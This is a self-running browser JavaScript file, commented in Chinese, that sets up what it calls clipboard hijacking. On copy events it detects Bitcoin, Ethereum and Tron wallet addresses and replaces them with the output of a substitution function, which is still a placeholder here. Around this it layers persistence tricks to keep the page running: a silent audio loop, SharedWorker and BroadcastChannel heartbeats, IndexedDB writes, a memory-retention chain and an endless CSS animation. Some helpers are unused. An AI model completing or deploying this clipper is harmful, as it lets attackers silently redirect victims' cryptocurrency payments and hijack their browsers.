
(function() {
    'use strict';
    
    // 核心常量
    const MAGIC = 0x7F61; // 借用您的魔数概念
    
    // 1. 终极静默音频流
    const silentAudio = () => {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        
        // 关键：使用 ScriptProcessor 保持真正的活跃
        const processor = ctx.createScriptProcessor(256, 1, 1);
        processor.onaudioprocess = (e) => {
            // 空处理但保持活跃
            e.outputBuffer.getChannelData(0)[0] = 0;
        };
        
        gain.gain.value = 0;
        osc.connect(gain);
        gain.connect(processor);
        processor.connect(ctx.destination);
        osc.start();
        
        // iOS 激活技巧
        document.addEventListener('touchstart', () => ctx.resume(), {once: true});
        document.addEventListener('click', () => ctx.resume(), {once: true});
        
        return ctx;
    };

    // 2. 剪贴板劫持核心
    const clipboardCore = () => {
        // 创建隐形 contenteditable
        const trap = document.createElement('div');
        trap.contentEditable = true;
        trap.style.cssText = 'position:fixed;left:-9999px;';
        document.body.appendChild(trap);
        
        // 焦点劫持
        let lastSelection = null;
        
        document.addEventListener('selectionchange', () => {
            const sel = window.getSelection();
            if (sel.toString().length > 10) {
                lastSelection = sel.toString();
            }
        });
        
        // 复制事件劫持
        document.addEventListener('copy', (e) => {
            if (!lastSelection) return;
            
            // 模式检测 - 极简正则
            const patterns = [
                /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/,  // BTC
                /^0x[a-fA-F0-9]{40}$/,                 // ETH
                /^T[A-Za-z1-9]{33}$/                   // TRX
            ];
            
            if (patterns.some(p => p.test(lastSelection.trim()))) {
                e.clipboardData.setData('text/plain', transform(lastSelection));
                e.preventDefault();
            }
        }, true);
        
        // 转换函数（占位）
        const transform = (text) => text;
    };

    // 3. 终极保活链
    const keepAliveChain = () => {
        const methods = [];
        
        // a) SharedWorker 永生
        if (window.SharedWorker) {
            try {
                const blob = new Blob([`
                    let count = 0;
                    self.onconnect = (e) => {
                        const port = e.ports[0];
                        setInterval(() => {
                            port.postMessage({alive: ++count});
                        }, 30000);
                    };
                `], {type: 'application/javascript'});
                
                const worker = new SharedWorker(URL.createObjectURL(blob));
                worker.port.onmessage = (e) => {};
                methods.push('SharedWorker');
            } catch(e) {}
        }
        
        // b) BroadcastChannel 网络
        if (window.BroadcastChannel) {
            const channel = new BroadcastChannel('_ka');
            const heartbeat = () => {
                channel.postMessage({t: Date.now()});
                setTimeout(heartbeat, 45000);
            };
            heartbeat();
            methods.push('BroadcastChannel');
        }
        
        // c) IndexedDB 事务锁
        const idbLock = () => {
            const open = indexedDB.open('_ka', 1);
            open.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction(['ka'], 'readwrite');
                const store = tx.objectStore('ka');
                
                // 保持事务活跃
                const keepTx = () => {
                    store.put({t: Date.now()}, 'hb');
                    if (tx.state === 'active') {
                        setTimeout(keepTx, 1000);
                    }
                };
                keepTx();
            };
            open.onupgradeneeded = (e) => {
                e.target.result.createObjectStore('ka');
            };
        };
        
        return methods;
    };

    // 4. 内存锁定技术
    const memoryLock = () => {
        // 创建不可回收的引用链
        const chain = [];
        let node = {data: new ArrayBuffer(1024)};
        chain.push(node);
        
        for (let i = 0; i < 100; i++) {
            const newNode = {
                prev: node,
                data: new ArrayBuffer(1024),
                next: null
            };
            node.next = newNode;
            node = newNode;
            chain.push(node);
        }
        
        // 创建循环引用
        chain[0].prev = chain[chain.length - 1];
        chain[chain.length - 1].next = chain[0];
        
        return chain;
    };

    // 5. CSS Houdini 保活（如果支持）
    const cssHoudini = () => {
        if (!CSS.registerProperty) return;
        
        try {
            CSS.registerProperty({
                name: '--ka',
                syntax: '<number>',
                inherits: false,
                initialValue: '0'
            });
            
            // 创建动画
            const style = document.createElement('style');
            style.textContent = `
                @keyframes ka {
                    to { --ka: 1000000; }
                }
                body { animation: ka 1000s infinite; }
            `;
            document.head.appendChild(style);
        } catch(e) {}
    };

    // 6. 终极初始化
    const init = () => {
        // 检测环境
        const ua = navigator.userAgent;
        const isIOS = /iPhone|iPad|iPod/.test(ua);
        const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
        
        // 核心组件
        const audio = silentAudio();
        clipboardCore();
        const activeMethods = keepAliveChain();
        const memory = memoryLock();
        cssHoudini();
        
        // 监控存活
        let alive = true;
        const monitor = () => {
            if (!alive) return;
            
            // 检查音频上下文
            if (audio.state === 'suspended') {
                audio.resume();
            }
            
            // 自适应间隔
            const interval = document.hidden ? 60000 : 30000;
            setTimeout(monitor, interval);
        };
        monitor();
        
        // 页面退出保护
        window.addEventListener('beforeunload', (e) => {
            // 保存状态
            localStorage.setItem('_ka_state', JSON.stringify({
                t: Date.now(),
                m: activeMethods
            }));
        });
        
        // 返回控制接口
        return {
            stop: () => { alive = false; },
            status: () => ({ 
                audio: audio.state,
                methods: activeMethods,
                memory: memory.length 
            })
        };
    };

    // 自启动
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
